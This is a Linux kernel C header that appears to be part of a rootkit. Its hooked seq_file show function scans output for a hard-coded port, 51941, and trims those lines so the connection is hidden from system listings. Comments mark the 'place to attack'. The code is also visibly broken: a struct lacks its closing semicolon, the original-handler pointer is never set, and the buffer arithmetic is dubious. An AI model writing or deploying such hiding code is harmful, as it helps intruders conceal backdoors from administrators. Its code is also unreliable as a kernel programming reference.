#ifndef SEQ_H
#define SEQ_H
#include <linux/seq_file.h>
#include <linux/slab.h>
#define SECRET_PORT "51941"
int (*origin_seq_show)(struct seq_file *f_seq, void *v);
static void *ct_seq_start(struct seq_file *f_seq, loff_t *pos)
{
    loff_t *spos = kmalloc(sizeof(loff_t), GFP_KERNEL);
    if(!spos)
        return  NULL;
    *spos = *pos;
    return spos;
}
static void *ct_seq_next(struct seq_file *f_seq, void *v, loff_t *pos)
{
    loff_t *spos = v;
    *pos = ++*spos;
    return spos;
}
static void ct_seq_stop(struct seq_file *f_seq, void *v)
{
    kfree(v);
}
static int ct_seq_show(struct seq_file *f_seq, void *v)
{
    loff_t *spos = v;
    int ret;
    char *msg;
    ret = origin_seq_show(f_seq, v);
    //need to add here call to real show
    // The start of the record = the start of the buffer + the amount already-the size of each record.
    msg = strnstr(f_seq->buf + f_seq->count -150, SECRET_PORT, 150);
    if (msg)
    {
        printk(KERN_ALERT "found:  %s ", SECRET_PORT);
        f_seq->count -=150;//decrese the count by 150 (equal to line) 
        //remove
    }
    seq_printf(f_seq, "%lld\n", (long long)*spos);/* <---- place to attack! ---->*/
    return 0;
}


static const struct seq_operations seq_ops = {
    .start = ct_seq_start,
    .next = ct_seq_next,    
    .stop = ct_seq_stop,   
    .show = ct_seq_show    /*  <----postion to attack---->      */
};
static int ct_open(struct inode *inode, struct file *file)
{
    return seq_open(file , &seq_ops);
}
static const struct file_operations fops = {
    .owner = THIS_MODULE,
    .open = ct_open,

}
#endif